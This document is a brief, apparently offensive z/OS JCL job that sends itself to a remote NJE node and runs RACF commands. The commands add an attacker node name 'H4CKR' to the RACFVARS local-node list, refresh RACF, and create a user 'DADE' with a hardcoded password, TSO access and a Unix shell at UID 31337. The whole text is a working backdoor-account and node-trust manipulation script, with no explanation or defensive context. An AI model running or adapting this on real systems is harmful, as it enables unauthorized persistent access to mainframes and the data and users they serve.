//H4CKRNJE JOB (1234567),'ABC 123',CLASS=A,
//             MSGLEVEL=(0,0),MSGCLASS=K,NOTIFY=&SYSUID
/*XEQ    NEWYORK
//TSOCMD   EXEC  PGM=IKJEFT01
//SYSTSPRT DD    SYSOUT=*
//SYSOUT   DD    SYSOUT=*
//SYSTSIN  DD    *
  RALTER RACFVARS &RACLNDE ADDMEM(H4CKR)
  SETROPTS RACLIST(RACFVARS) REFRESH
  ADDUSER DADE PASSWORD(BESTPWD)
  ALU DADE TSO(ACCTNUM(ACCT#) PROC(ISPFPROC))
  ALU DADE OMVS(UID(31337) PROGRAM(/bin/sh) HOME(/))
/*
